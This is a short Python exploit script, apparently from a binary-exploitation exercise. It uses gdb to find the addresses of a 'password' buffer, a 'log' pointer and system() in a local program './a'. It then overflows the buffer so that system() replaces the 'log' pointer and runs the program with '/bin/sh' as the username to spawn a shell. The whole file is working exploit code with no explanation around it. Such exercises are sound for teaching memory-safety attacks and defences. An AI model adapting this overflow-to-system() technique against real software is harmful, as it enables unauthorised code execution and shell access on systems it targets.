import os
import re
import struct
import subprocess


# gdb <program> --batch -ex <command> -ex <command> ... loads <program> into gdb and runs all the <commands> on it.
output = subprocess.check_output(['gdb', './a', '--batch',
    '-ex', 'break 34',
    '-ex', 'run foo bar',
    '-ex', 'print password',
    '-ex', 'print log',
    '-ex', 'print system',
])

# The "print password" command prints $1 = (...) 0x...
password_address = int(re.search(r'\$1 =.*?0x([0-9a-f]*)', output).group(1), 16)
# The "print log" command prints $2 = (...) 0x...
log_address = int(re.search(r'\$2 =.*?0x([0-9a-f]*)', output).group(1), 16)
# The "print system" command prints $3 = {...} 0x... <...>
system_address = int(re.search(r'\$3 =.*?0x([0-9a-f]*)', output).group(1), 16)

print('password address is 0x%08x, log address is 0x%08x and system address is 0x%08x' % (password_address, log_address, system_address))

username = '/bin/sh'
password = 'a'*(log_address - password_address) + struct.pack('<I', system_address)

# Let's go!
os.execl('./a', './a', username, password)
